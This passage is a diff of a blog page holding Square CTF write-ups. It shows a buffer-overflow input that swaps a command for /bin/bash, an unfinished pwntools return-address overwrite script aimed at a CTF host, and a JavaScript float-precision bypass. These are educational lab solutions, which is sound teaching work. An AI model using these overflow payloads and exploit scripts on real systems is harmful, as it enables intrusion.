@@ -66,23 +66,31 @@
 <summary id="table-of-contents-header"> Table of Contents </summary>
 
 <ul>
-<li><a href="#ez-pwn-1-2022">EZ pwn 1 (2022)</a></li>
-<li><a href="#ez-pwn-2-2022">EZ pwn 2 (2022)</a></li>
-<li><a href="#huge-primes-2021">Huge Primes (2021)</a></li>
-<li><a href="#developers-hubris-2022">Developer’s Hubris (2022)</a></li>
-<li><a href="#korean-space-program-2021">Korean Space Program (2021)</a></li>
+<li><a href="#ez-pwn-1-2022" id="toc-ez-pwn-1-2022">EZ pwn 1
+(2022)</a></li>
+<li><a href="#ez-pwn-2-2022" id="toc-ez-pwn-2-2022">EZ pwn 2
+(2022)</a></li>
+<li><a href="#huge-primes-2021" id="toc-huge-primes-2021">Huge Primes
+(2021)</a></li>
+<li><a href="#developers-hubris-2022"
+id="toc-developers-hubris-2022">Developer’s Hubris (2022)</a></li>
+<li><a href="#korean-space-program-2021"
+id="toc-korean-space-program-2021">Korean Space Program (2021)</a></li>
 </ul>
 
 </details>
 
-<p>Related: <a href="/blog/square-ctf-2022.html">Hosting these challenges</a></p>
+<p>Related: <a href="/blog/square-ctf-2022.html">Hosting these
+challenges</a></p>
 <h2 id="ez-pwn-1-2022">EZ pwn 1 (2022)</h2>
-<p><a href="https://squarectf.com/2022/ezpwn1.html" class="uri">https://squarectf.com/2022/ezpwn1.html</a></p>
+<p><a href="https://squarectf.com/2022/ezpwn1.html"
+class="uri">https://squarectf.com/2022/ezpwn1.html</a></p>
 <blockquote>
 <p><strong>Challenge Description:</strong></p>
 <p>Memory safety? Whats that? Required Reading:</p>
 <ul>
-<li><a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow" class="uri">https://en.wikipedia.org/wiki/Stack_buffer_overflow</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow"
+class="uri">https://en.wikipedia.org/wiki/Stack_buffer_overflow</a></li>
 </ul>
 </blockquote>
 <p>Along with this challenge, we are given the following C program:</p>
@@ -109,21 +117,38 @@
 <span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a>    system<span class="op">(</span>command<span class="op">);</span></span>
 <span id="cb1-22"><a href="#cb1-22" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb1-23"><a href="#cb1-23" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
-<p>This helpful program starts by copying a command into memory, which will then be executed at runtime.</p>
-<p>In ideal usage, we can netcat into this server, and it will helpfully print out the files:</p>
-<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> nc YOUR_HOST YOUR_PORT</span>
+<p>This helpful program starts by copying a command into memory, which
+will then be executed at runtime.</p>
+<p>In ideal usage, we can netcat into this server, and it will helpfully
+print out the files:</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> nc YOUR_HOST YOUR_PORT</span>
 <span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Hi!</span> would you like me to ls the current directory<span class="pp">?</span></span>
 <span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="fu">yes</span>!</span>
 <span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Ok,</span> here ya go!</span>
 <span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="ex">ez-pwn-1</span>  the_flag_is_in_here</span></code></pre></div>
-<p>Hmm, it looks like there’s a directory called <code>the_flag_is_in_here</code>. It sure would be nice if we could do more than just <code>ls</code>.</p>
+<p>Hmm, it looks like there’s a directory called
+<code>the_flag_is_in_here</code>. It sure would be nice if we could do
+more than just <code>ls</code>.</p>
 <p>Let’s look at the core part of the program:</p>
 <div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="dt">char</span> way_too_small_input_buf<span class="op">[</span><span class="dv">8</span><span class="op">];</span></span>
 <span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="co">// ...</span></span>
 <span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>read<span class="op">(</span><span class="dv">0</span><span class="op">,</span> way_too_small_input_buf<span class="op">,</span> <span class="dv">24</span><span class="op">);</span> <span class="co">// read input from user into that buffer</span></span></code></pre></div>
-<p>The <code>read</code> function is trying to read 24 bytes of data into <code>way_too_small_input_buf</code>, which is only 8 bytes in size. This means that if a user inputs more than 8 bytes, the excess data will overflow into the adjacent memory space, which in this case is occupied by the <code>command</code> buffer.</p>
-<p>In C, local variable order is <strong>implementation defined</strong>. That is, we can’t guarantee it’s going to be in a specific order. However, when C is compiled with <a href="https://gcc.gnu.org/">gcc</a>, variables are stored on the stack in the reverse order of their declaration. So, even though <code>way_too_small_input_buf</code> is declared after <code>command</code>, it is actually located at a lower memory address. When a buffer overflow occurs, it overflows upwards into higher memory addresses, affecting <code>command</code> in this case.</p>
+<p>The <code>read</code> function is trying to read 24 bytes of data
+into <code>way_too_small_input_buf</code>, which is only 8 bytes in
+size. This means that if a user inputs more than 8 bytes, the excess
+data will overflow into the adjacent memory space, which in this case is
+occupied by the <code>command</code> buffer.</p>
+<p>In C, local variable order is <strong>implementation
+defined</strong>. That is, we can’t guarantee it’s going to be in a
+specific order. However, when C is compiled with <a
+href="https://gcc.gnu.org/">gcc</a>, variables are stored on the stack
+in the reverse order of their declaration. So, even though
+<code>way_too_small_input_buf</code> is declared after
+<code>command</code>, it is actually located at a lower memory address.
+When a buffer overflow occurs, it overflows upwards into higher memory
+addresses, affecting <code>command</code> in this case.</p>
 <pre><code>Higher memory addresses
 ---------------------------
 |     command             |
@@ -132,7 +157,9 @@
 ---------------------------
 Lower memory addresses
 </code></pre>
-<p>So, if a buffer overflow occurs in <code>way_too_small_input_buf</code>, it will overflow into the memory space occupied by <code>command</code>.</p>
+<p>So, if a buffer overflow occurs in
+<code>way_too_small_input_buf</code>, it will overflow into the memory
+space occupied by <code>command</code>.</p>
 <p>Using this information, we can try to overflow the buffer:</p>
 <pre><code>Higher memory addresses
 ------------
@@ -147,7 +174,8 @@ aaaaaaaapwd
 Ok, here ya go!
 
 /home/pwnable_user</code></pre>
-<p>That’s great! We just changed the command it’s executing. Let’s try using <code>/bin/bash</code> to get an executable shell.</p>
+<p>That’s great! We just changed the command it’s executing. Let’s try
+using <code>/bin/bash</code> to get an executable shell.</p>
 <p>And, there we go!</p>
 <pre><code>Hi! would you like me to ls the current directory?
 aaaaaaaa/bin/bash
@@ -163,20 +191,31 @@ flag.txt
 cat flag.txt
 flag{congrats_youve_exploited_a_memory_corruption_vulnerability}</code></pre>
 <h2 id="ez-pwn-2-2022">EZ pwn 2 (2022)</h2>
-<p><a href="https://squarectf.com/2022/ezpwn2.html" class="uri">https://squarectf.com/2022/ezpwn2.html</a></p>
+<p><a href="https://squarectf.com/2022/ezpwn2.html"
+class="uri">https://squarectf.com/2022/ezpwn2.html</a></p>
 <p>Challenge Description:</p>
 <blockquote>
 <p><strong>Required reading:</strong></p>
 <ul>
-<li><p><a href="https://www.cs.virginia.edu/~evans/cs216/guides/x86.html">intro to x86</a></p></li>
-<li><p><a href="https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64">x86-64 stack layout</a></p></li>
-<li><p><a href="https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/">Stack Canaries</a></p></li>
-<li><p><a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow">stack based buffer overflows</a></p></li>
-<li><p><a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a></p></li>
+<li><p><a
+href="https://www.cs.virginia.edu/~evans/cs216/guides/x86.html">intro to
+x86</a></p></li>
+<li><p><a
+href="https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64">x86-64
+stack layout</a></p></li>
+<li><p><a
+href="https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/">Stack
+Canaries</a></p></li>
+<li><p><a
+href="https://en.wikipedia.org/wiki/Stack_buffer_overflow">stack based
+buffer overflows</a></p></li>
+<li><p><a
+href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a></p></li>
 </ul>
 <p><strong>Optional Reading:</strong></p>
 <ul>
-<li><a href="https://docs.pwntools.com/en/stable/intro.html#making-connections">pwntools</a></li>
+<li><a
+href="https://docs.pwntools.com/en/stable/intro.html#making-connections">pwntools</a></li>
 </ul>
 </blockquote>
 <p>And we are given the following C program:</p>
@@ -189,7 +228,7 @@ flag{congrats_youve_exploited_a_memory_corruption_vulnerability}</code></pre>
 <span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> byte_ind <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
 <span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(</span><span class="dt">int</span> count <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> count <span class="op">&lt;</span> size<span class="op">;</span> count <span class="op">+=</span> <span class="dv">2</span><span class="op">)</span></span>
 <span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
-<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a>        sscanf<span class="op">(&amp;</span>hex_str<span class="op">[</span>count<span class="op">],</span> <span class="st">&quot;%2hhx&quot;</span><span class="op">,</span> <span class="op">&amp;</span>byte_arr<span class="op">[</span>byte_ind<span class="op">]);</span></span>
+<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a>        sscanf<span class="op">(&amp;</span>hex_str<span class="op">[</span>count<span class="op">],</span> <span class="st">&quot;</span><span class="sc">%2hhx</span><span class="st">&quot;</span><span class="op">,</span> <span class="op">&amp;</span>byte_arr<span class="op">[</span>byte_ind<span class="op">]);</span></span>
 <span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a>        byte_ind<span class="op">++;</span></span>
 <span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
 <span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
@@ -199,7 +238,7 @@ flag{congrats_youve_exploited_a_memory_corruption_vulnerability}</code></pre>
 <span id="cb8-17"><a href="#cb8-17" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
 <span id="cb8-18"><a href="#cb8-18" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(</span><span class="dt">int</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> sz<span class="op">;</span> i<span class="op">++)</span></span>
 <span id="cb8-19"><a href="#cb8-19" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
-<span id="cb8-20"><a href="#cb8-20" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;%02X&quot;</span><span class="op">,</span> buf<span class="op">[</span>i<span class="op">]);</span></span>
+<span id="cb8-20"><a href="#cb8-20" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;</span><span class="sc">%02X</span><span class="st">&quot;</span><span class="op">,</span> buf<span class="op">[</span>i<span class="op">]);</span></span>
 <span id="cb8-21"><a href="#cb8-21" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
 <span id="cb8-22"><a href="#cb8-22" aria-hidden="true" tabindex="-1"></a>    puts<span class="op">(</span><span class="st">&quot;</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
 <span id="cb8-23"><a href="#cb8-23" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
@@ -217,10 +256,10 @@ flag{congrats_youve_exploited_a_memory_corruption_vulnerability}</code></pre>
 <span id="cb8-35"><a href="#cb8-35" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
 <span id="cb8-36"><a href="#cb8-36" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>leak_addr<span class="op">;</span></span>
 <span id="cb8-37"><a href="#cb8-37" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> this_buffer_is_definitely_too_small_for_that_read<span class="op">[</span><span class="dv">17</span><span class="op">];</span></span>
-<span id="cb8-38"><a href="#cb8-38" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;You are here: %p</span><span class="sc">\n</span><span class="st"> Give me an address and I will grant you 8 leaked bytes:</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> this_buffer_is_definitely_too_small_for_that_read<span class="op">);</span></span>
+<span id="cb8-38"><a href="#cb8-38" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;You are here: </span><span class="sc">%p\n</span><span class="st"> Give me an address and I will grant you 8 leaked bytes:</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> this_buffer_is_definitely_too_small_for_that_read<span class="op">);</span></span>
 <span id="cb8-39"><a href="#cb8-39" aria-hidden="true" tabindex="-1"></a>    read<span class="op">(</span><span class="dv">0</span><span class="op">,</span> this_buffer_is_definitely_too_small_for_that_read<span class="op">,</span> <span class="dv">64</span><span class="op">);</span></span>
 <span id="cb8-40"><a href="#cb8-40" aria-hidden="true" tabindex="-1"></a>    hex_string_to_byte_array<span class="op">(</span>this_buffer_is_definitely_too_small_for_that_read<span class="op">,</span> <span class="op">(</span><span class="dt">char</span> <span class="op">*)&amp;</span>leak_addr<span class="op">,</span> <span class="dv">16</span><span class="op">);</span></span>
-<span id="cb8-41"><a href="#cb8-41" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;Here are the contents of %p:</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> leak_addr<span class="op">);</span></span>
+<span id="cb8-41"><a href="#cb8-41" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;Here are the contents of </span><span class="sc">%p</span><span class="st">:</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> leak_addr<span class="op">);</span></span>
 <span id="cb8-42"><a href="#cb8-42" aria-hidden="true" tabindex="-1"></a>    print_buf<span class="op">(</span>leak_addr<span class="op">,</span> <span class="dv">8</span><span class="op">);</span></span>
 <span id="cb8-43"><a href="#cb8-43" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
 <span id="cb8-44"><a href="#cb8-44" aria-hidden="true" tabindex="-1"></a></span>
@@ -232,16 +271,31 @@ flag{congrats_youve_exploited_a_memory_corruption_vulnerability}</code></pre>
 <span id="cb8-50"><a href="#cb8-50" aria-hidden="true" tabindex="-1"></a>        gimme_pointer<span class="op">();</span></span>
 <span id="cb8-51"><a href="#cb8-51" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
 <span id="cb8-52"><a href="#cb8-52" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
-<p>Looking at the required reading, we see a reference to the x86-64 stack layout.</p>
-<p><a href="https://eli.thegreenplace.net/2011/02/04/where-the-top-of-the-stack-is-on-x86/">Eli Bendersky’s blog post</a> has a great series of diagrams showing how data is pushed onto the stack.</p>
-<p>When a buffer overflow occurs, you’re writing more data to a local variable than it can hold. This extra data can overwrite other local variables and even the return address. By carefully controlling the data that’s written, you can overwrite the return address with an address of your choosing.</p>
+<p>Looking at the required reading, we see a reference to the x86-64
+stack layout.</p>
+<p><a
+href="https://eli.thegreenplace.net/2011/02/04/where-the-top-of-the-stack-is-on-x86/">Eli
+Bendersky’s blog post</a> has a great series of diagrams showing how
+data is pushed onto the stack.</p>
+<p>When a buffer overflow occurs, you’re writing more data to a local
+variable than it can hold. This extra data can overwrite other local
+variables and even the return address. By carefully controlling the data
+that’s written, you can overwrite the return address with an address of
+your choosing.</p>
 <p>Looking at the code:</p>
 <div class="sourceCode" id="cb9"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="dt">char</span> this_buffer_is_definitely_too_small_for_that_read<span class="op">[</span><span class="dv">17</span><span class="op">];</span></span>
-<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>printf<span class="op">(</span><span class="st">&quot;You are here: %p</span><span class="sc">\n</span><span class="st"> Give me an address and I will grant you 8 leaked bytes:</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> this_buffer_is_definitely_too_small_for_that_read<span class="op">);</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>printf<span class="op">(</span><span class="st">&quot;You are here: </span><span class="sc">%p\n</span><span class="st"> Give me an address and I will grant you 8 leaked bytes:</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> this_buffer_is_definitely_too_small_for_that_read<span class="op">);</span></span>
 <span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>read<span class="op">(</span><span class="dv">0</span><span class="op">,</span> this_buffer_is_definitely_too_small_for_that_read<span class="op">,</span> <span class="dv">64</span><span class="op">);</span></span></code></pre></div>
-<p>Our goal here is to find the offset of the function <code>this_function_literally_prints_the_flag</code>.</p>
-<p>The gimme_pointer function has a buffer overflow vulnerability because it reads 64 bytes into a 17-byte buffer. This can overwrite the saved return address on the stack. If we can control this overwrite, we can make the function return to this_function_literally_prints_the_flag instead of where it was supposed to go.</p>
-<p>Also, note that modern systems use Address Space Layout Randomization (ASLR) to randomize the location of functions in memory, so we’re going to have to do this calculation based on the printed hex value.</p>
+<p>Our goal here is to find the offset of the function
+<code>this_function_literally_prints_the_flag</code>.</p>
+<p>The gimme_pointer function has a buffer overflow vulnerability
+because it reads 64 bytes into a 17-byte buffer. This can overwrite the
+saved return address on the stack. If we can control this overwrite, we
+can make the function return to this_function_literally_prints_the_flag
+instead of where it was supposed to go.</p>
+<p>Also, note that modern systems use Address Space Layout Randomization
+(ASLR) to randomize the location of functions in memory, so we’re going
+to have to do this calculation based on the printed hex value.</p>
 <p>It’s also important to note how our input must be formed:</p>
 <pre><code>Hi! I am the Stack Oracle.
 
@@ -249,16 +303,25 @@ You are here: 0x7ffc771ffd60
  Give me an address and I will grant you 8 leaked bytes:
 deadbeef
 Here are the contents of 0xefbeadde:</code></pre>
-<p>In little endian format, the least significant byte is stored first. So, for the hexadecimal number <a href="https://en.wikipedia.org/wiki/0xDEADBEEF">deadbeef</a>, it would be stored and interpreted as <code>efbeadde</code>.</p>
-<p>This is why when we input <code>deadbeef</code>, the program reads it as 0xefbeadde. If you want the program to interpret it as <code>0xdeadbeef</code>, you would need to input it in little endian format, which would be <code>efbeadde</code>.</p>
+<p>In little endian format, the least significant byte is stored first.
+So, for the hexadecimal number <a
+href="https://en.wikipedia.org/wiki/0xDEADBEEF">deadbeef</a>, it would
+be stored and interpreted as <code>efbeadde</code>.</p>
+<p>This is why when we input <code>deadbeef</code>, the program reads it
+as 0xefbeadde. If you want the program to interpret it as
+<code>0xdeadbeef</code>, you would need to input it in little endian
+format, which would be <code>efbeadde</code>.</p>
 <pre><code>Hi! I am the Stack Oracle.
 
 You are here: 0x7ffff5a86980
  Give me an address and I will grant you 8 leaked bytes:
 efbeadde
 Here are the contents of 0xdeadbeef:</code></pre>
-<p>I’m gonna be real with you: i haven’t figured this out yet. If I find a solution, I’ll update you here. This is my best attempt so far, but I think I’m missing something.</p>
-<div class="sourceCode" id="cb12"><pre class="sourceCode py"><code class="sourceCode python"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<p>I’m gonna be real with you: i haven’t figured this out yet. If I find
+a solution, I’ll update you here. This is my best attempt so far, but I
+think I’m missing something.</p>
+<div class="sourceCode" id="cb12"><pre
+class="sourceCode py"><code class="sourceCode python"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
 <span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> to_little_endian(hex_str: <span class="bu">str</span>) <span class="op">-&gt;</span> <span class="bu">str</span>:</span>
 <span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a>    <span class="co"># ensure the hex number has even length</span></span>
@@ -277,7 +340,7 @@ Here are the contents of 0xdeadbeef:</code></pre>
 <span id="cb12-17"><a href="#cb12-17" aria-hidden="true" tabindex="-1"></a>    conn <span class="op">=</span> remote(<span class="st">&#39;ctfd.zack.fyi&#39;</span>, <span class="dv">8003</span>)</span>
 <span id="cb12-18"><a href="#cb12-18" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb12-19"><a href="#cb12-19" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Read the initial output from the server</span></span>
-<span id="cb12-20"><a href="#cb12-20" aria-hidden="true" tabindex="-1"></a>    output <span class="op">=</span> conn.recvuntil(b<span class="st">&#39;Give me an address and I will grant you 8 leaked bytes:</span><span class="ch">\n</span><span class="st">&#39;</span>)</span>
+<span id="cb12-20"><a href="#cb12-20" aria-hidden="true" tabindex="-1"></a>    output <span class="op">=</span> conn.recvuntil(<span class="st">b&#39;Give me an address and I will grant you 8 leaked bytes:</span><span class="ch">\n</span><span class="st">&#39;</span>)</span>
 <span id="cb12-21"><a href="#cb12-21" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb12-22"><a href="#cb12-22" aria-hidden="true" tabindex="-1"></a>    output_str <span class="op">=</span> output.decode(<span class="st">&#39;utf-8&#39;</span>) <span class="co"># ensure connection is text</span></span>
 <span id="cb12-23"><a href="#cb12-23" aria-hidden="true" tabindex="-1"></a></span>
@@ -313,15 +376,19 @@ Here are the contents of 0xdeadbeef:</code></pre>
 <span id="cb12-53"><a href="#cb12-53" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> offset <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">13</span>, <span class="dv">25</span>):</span>
 <span id="cb12-54"><a href="#cb12-54" aria-hidden="true" tabindex="-1"></a>    hack(offset)</span></code></pre></div>
 <h2 id="huge-primes-2021">Huge Primes (2021)</h2>
-<p><a href="https://squarectf.com/2021/hugeprimes.html" class="uri">https://squarectf.com/2021/hugeprimes.html</a></p>
+<p><a href="https://squarectf.com/2021/hugeprimes.html"
+class="uri">https://squarectf.com/2021/hugeprimes.html</a></p>
 <blockquote>
-<p>Find the prime factors of <code>22952152323332505688670761214671498225451684330137990990356473040741684014997701799009910066964917896400501477</code></p>
+<p>Find the prime factors of
+<code>22952152323332505688670761214671498225451684330137990990356473040741684014997701799009910066964917896400501477</code></p>
 </blockquote>
 <p>This challenge is designed to trick you.</p>
-<p>Factoring this really large number is going to be incredibly difficult.</p>
+<p>Factoring this really large number is going to be incredibly
+difficult.</p>
 <p>This is really a challenge about binary numbers in JavaScript.</p>
 <p>We are provided with the file <code>sourcecode.js</code>:</p>
-<div class="sourceCode" id="cb13"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> express <span class="op">=</span> <span class="pp">require</span>(<span class="st">&quot;express&quot;</span>)<span class="op">;</span></span>
+<div class="sourceCode" id="cb13"><pre
+class="sourceCode js"><code class="sourceCode javascript"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> express <span class="op">=</span> <span class="pp">require</span>(<span class="st">&quot;express&quot;</span>)<span class="op">;</span></span>
 <span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> bodyParser <span class="op">=</span> <span class="pp">require</span>(<span class="st">&quot;body-parser&quot;</span>)<span class="op">;</span></span>
 <span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> app <span class="op">=</span> <span class="fu">express</span>()<span class="op">;</span></span>
 <span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> hugeProductOfPrimes <span class="op">=</span> <span class="dv">22952152323332505688670761214671498225451684330137990990356473040741684014997701799009910066964917896400501477</span><span class="op">;</span></span>
@@ -356,75 +423,128 @@ Here are the contents of 0xdeadbeef:</code></pre>
 <span id="cb13-33"><a href="#cb13-33" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
 <p>Here is the solution provided by the challenge author:</p>
 <blockquote>
-<p>One solution is to find the actual prime factors of 22952152323332505688670761214671498225451684330137990990356473040741684014997701799009910066964917896400501477 by actually factorizing it. The solution is 618706242907094285939447607839 * 37097011039500744117766681095100420923783393727502071430377140015810453843499643 (I know because I generated these two primes and multipled them together :P) This is nontrivial however, and not even I know the prime factors :P</p>
-<p>However, all numbers in JavaScript are floats, and beyond 2^53 - 1, all numbers in js are floats. With a number as large as the one above, this means that the double precision representation of the number is:</p>
+<p>One solution is to find the actual prime factors of
+22952152323332505688670761214671498225451684330137990990356473040741684014997701799009910066964917896400501477
+by actually factorizing it. The solution is
+618706242907094285939447607839 *
+37097011039500744117766681095100420923783393727502071430377140015810453843499643
+(I know because I generated these two primes and multipled them together
+:P) This is nontrivial however, and not even I know the prime factors
+:P</p>
+<p>However, all numbers in JavaScript are floats, and beyond 2^53 - 1,
+all numbers in js are floats. With a number as large as the one above,
+this means that the double precision representation of the number
+is:</p>
 <p>1.0011100010111011111000001010110110101011111111100001 * 2^363</p>
-<p>Which is equal to 22952152323332505416587153773067821404219604570062873267600242062142093944707836288883856033656043372550291456 (which is definitely NOT the same number!). In fact, with numbers that large, all numbers in js are actually just powers of 2 and thus, are even!</p>
-<p>This leads to weird quirks, such as the fact that 22952152323332505416587153773067821404219604570062873267600242062142093944707836288883856033656043372550291456 == 22952152323332505688670761214671498225451684330137990990356473040741684014997701799009910066964917896400501477 returns true</p>
-<p>We could thus bypass the check with something like this: 22952152323332505688670761214671498225451684330137990990356473040741684014997701799009910066964917896400501477 / 2 = 1.1476076161666253e+109</p>
-<p>Note that this returns true: 1.1476076161666253e+109 * 2 == 22952152323332505688670761214671498225451684330137990990356473040741684014997701799009910066964917896400501477</p>
+<p>Which is equal to
+22952152323332505416587153773067821404219604570062873267600242062142093944707836288883856033656043372550291456
+(which is definitely NOT the same number!). In fact, with numbers that
+large, all numbers in js are actually just powers of 2 and thus, are
+even!</p>
+<p>This leads to weird quirks, such as the fact that
+22952152323332505416587153773067821404219604570062873267600242062142093944707836288883856033656043372550291456
+==
+22952152323332505688670761214671498225451684330137990990356473040741684014997701799009910066964917896400501477
+returns true</p>
+<p>We could thus bypass the check with something like this:
+22952152323332505688670761214671498225451684330137990990356473040741684014997701799009910066964917896400501477
+/ 2 = 1.1476076161666253e+109</p>
+<p>Note that this returns true: 1.1476076161666253e+109 * 2 ==
+22952152323332505688670761214671498225451684330137990990356473040741684014997701799009910066964917896400501477</p>
 <p>(see https://www.exploringbinary.com/the-spacing-of-binary-float)</p>
 </blockquote>
-<p>To solve this one, I recommend used WolframAlpha to handle the math for me, in scientific notation, with the query “number / 2 in scientific notation” (<a href="https://www.wolframalpha.com/input?i=22952152323332505688670761214671498225451684330137990990356473040741684014997701799009910066964917896400501477%2F2+in+scientific+notation">link</a>)</p>
+<p>To solve this one, I recommend used WolframAlpha to handle the math
+for me, in scientific notation, with the query “number / 2 in scientific
+notation” (<a
+href="https://www.wolframalpha.com/input?i=22952152323332505688670761214671498225451684330137990990356473040741684014997701799009910066964917896400501477%2F2+in+scientific+notation">link</a>)</p>
 <figure>
-<img src="../assets/square-ctf/image-20231110152553520.png" alt="Scientific notation = 1.14761…×10^109" /><figcaption aria-hidden="true">Scientific notation = 1.14761…×10^109</figcaption>
+<img src="../assets/square-ctf/image-20231110152553520.png"
+alt="Scientific notation = 1.14761…×10^109" />
+<figcaption aria-hidden="true">Scientific notation =
+1.14761…×10^109</figcaption>
 </figure>
-<p>Clicking ‘more digits’, and converting the result to Javascript yields us <code>1.1476076161666252e109</code> and <code>2</code>, which gives us the flag.</p>
+<p>Clicking ‘more digits’, and converting the result to Javascript
+yields us <code>1.1476076161666252e109</code> and <code>2</code>, which
+gives us the flag.</p>
 <h2 id="developers-hubris-2022">Developer’s Hubris (2022)</h2>
-<p><a href="https://squarectf.com/2022/developershubris.html" class="uri">https://squarectf.com/2022/developershubris.html</a></p>
+<p><a href="https://squarectf.com/2022/developershubris.html"
+class="uri">https://squarectf.com/2022/developershubris.html</a></p>
 <blockquote>
-<p>You’re a new security engineer at the company, and you just found a fairly old, unfinished application running in a staging environment that is exposed to the internet. You bring this up to the developers, since it seems likely that hackers will look for ways to use this application as an entrypoint into the corporate environment. However, they tell you that it’s just a basic bug report submission portal, and any dangerous code has been removed or hidden, so it should be safe. See if they left any loose ends that could be used to compromise the entire application</p>
+<p>You’re a new security engineer at the company, and you just found a
+fairly old, unfinished application running in a staging environment that
+is exposed to the internet. You bring this up to the developers, since
+it seems likely that hackers will look for ways to use this application
+as an entrypoint into the corporate environment. However, they tell you
+that it’s just a basic bug report submission portal, and any dangerous
+code has been removed or hidden, so it should be safe. See if they left
